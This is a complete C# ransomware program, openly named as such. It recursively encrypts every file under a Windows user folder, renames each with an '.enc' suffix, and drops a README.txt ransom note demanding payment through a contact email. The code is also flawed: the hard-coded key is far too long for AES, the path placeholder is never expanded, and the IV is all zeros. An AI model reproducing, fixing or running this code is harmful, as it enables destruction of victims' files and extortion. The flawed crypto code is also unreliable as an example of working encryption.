using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

// Decryption key, change the key if you want to.
class Ransomware
{
    private static readonly string key = "3j4j5HKL98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4l3j4j5HKL98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsjNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsjjNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4l3j4j5HKL98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsjNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsjjNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4l3j4j5HKL98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsjNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj94jNNv4lNNv4l98jsj94jNNv4l98jsj94jNNv4l98jsj"; 

    public static void Main()
    {
        string targetDir = @"C:\Users\%user%\";
        EncryptDirectory(targetDir);
        CreateRansomNote(targetDir);
    }

    public static void EncryptDirectory(string targetDir)
    {
        foreach (string filePath in Directory.GetFiles(targetDir))
        {
            EncryptFile(filePath);
        }

        foreach (string dir in Directory.GetDirectories(targetDir))
        {
            EncryptDirectory(dir);
        }
    }

    public static void EncryptFile(string filePath)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = new byte[16]; // Initialization vector

            ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
            using (CryptoStream cryptoStream = new CryptoStream(fileStream, encryptor, CryptoStreamMode.Write))
            using (BinaryWriter binaryWriter = new BinaryWriter(cryptoStream))
            {
                byte[] buffer = File.ReadAllBytes(filePath);
                fileStream.SetLength(0);
                binaryWriter.Write(buffer);
            }
        }

        File.Move(filePath, filePath + ".enc");
    }

    public static void CreateRansomNote(string targetDir)
    {
        string ransomNotePath = Path.Combine(targetDir, "README.txt");
        using (StreamWriter writer = new StreamWriter(ransomNotePath))
        {
            writer.WriteLine("Your files have been encrypted.");
            writer.WriteLine("To Decrypt Them, You Need To Pay A Ransom.");
            writer.WriteLine("Contact Us At shadow.locker1@gmail.com For Payment Instructions. :)");
            writer.WriteLine("<WARNING>: Do NOT Try To Decrypt Your Files With 3rd Party Decryption Tools As It WILL Result In Permanent data Loss XD");
        }
    }
}
